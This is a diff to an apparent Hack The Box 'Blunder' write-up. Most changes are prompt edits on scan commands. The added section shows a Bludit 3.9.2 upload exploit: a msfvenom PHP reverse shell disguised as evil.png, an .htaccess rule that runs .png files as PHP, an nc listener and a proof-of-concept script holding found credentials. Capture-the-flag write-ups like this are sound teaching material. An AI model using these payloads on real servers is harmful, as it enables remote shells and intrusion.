@@ -15,7 +15,7 @@ tags: [hackthebox, ]
 Let’s begin with an initial port scan:
 
 ```console
-# nmap -Pn --open -p- -sC -sV 10.10.10.191
+$ nmap -Pn --open -p- -sC -sV 10.10.10.191
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 14:25 EDT
 Nmap scan report for 10.10.10.191
@@ -44,7 +44,7 @@ Nmap done: 1 IP address (1 host up) scanned in 117.15 seconds
 Used [dirsearch](https://github.com/maurosoria/dirsearch) to further enumerate the website.
 
 ```console
-# python3 dirsearch.py -u http://10.10.10.191/ -e txt,php,asp,js | grep 200
+$ python3 dirsearch.py -u http://10.10.10.191/ -e txt,php,asp,js | grep 200
 
 [15:41:45] 200 -  563B  - /.gitignore                               
 [15:41:55] 200 -    3KB - /about                               
@@ -68,7 +68,7 @@ Additionally, `/.gitignore` had a list of BLUDIT script contents. By searching, 
 I also ran another web discovery tool [FFUF](https://github.com/ffuf/ffuf) just in case I missed anything. I found another `.txt` file called `todo.txt` which contained the potential useranme `fergus`.
 
 ```console
-# ./ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .txt -u http://10.10.10.191/FUZZ -fc 403
+$ ./ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .txt -u http://10.10.10.191/FUZZ -fc 403
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -180,7 +180,43 @@ with open('passList.txt') as fp:
 
 ![image](/assets/img/post/htb/blunder/06_bludit-pass.png)
 
+### Bludit 3.9.2 - Directory Traversal Image Upload
 
+Using the [POC script](https://www.exploit-db.com/exploits/48701), I obtained the reverse shell from the target box.
 
+First, create the `evil.png` with a reverse shell and a `.htacess` file.
+
+```console
+### Creating evil.png
+$ msfvenom -p php/reverse_php LHOST=10.10.14.15 LPORT=443 -f raw -b '"' > evil.png
+$ echo -e "<?php $(cat evil.png)" > evil.png
+
+### Creating .htaccess
+$ echo "RewriteEngine off" > .htaccess
+$ echo "AddType application/x-httpd-php .png" >> .htaccess
+```
+Then, update the `poc.py` script with our URL and login credentials.
+
+```python
+...snip...
+
+url = 'http://10.10.10.191'  # CHANGE ME
+username = 'fergus'          # CHANGE ME
+password = 'RolandDeschain'  # CHANGE ME
+
+...snip...
+```
+
+While running the listener `nc -lvnp 443`, execute the `poc.py` script and visit the upload image page at `http://10.10.10.191/bl-content/tmp/temp/evil.png`.
+
+```consols
+$ python3 poc.py 
+cookie: 335s5kf5clu2j8pe3oe23k93k1
+csrf_token: ef167ea5717fc72c4359195bd051aaf3495918ae
+Uploading payload: evil.png
+Uploading payload: .htaccess
+```
+
+![image](/assets/img/post/htb/blunder/07-rev-shell.png)
 
 
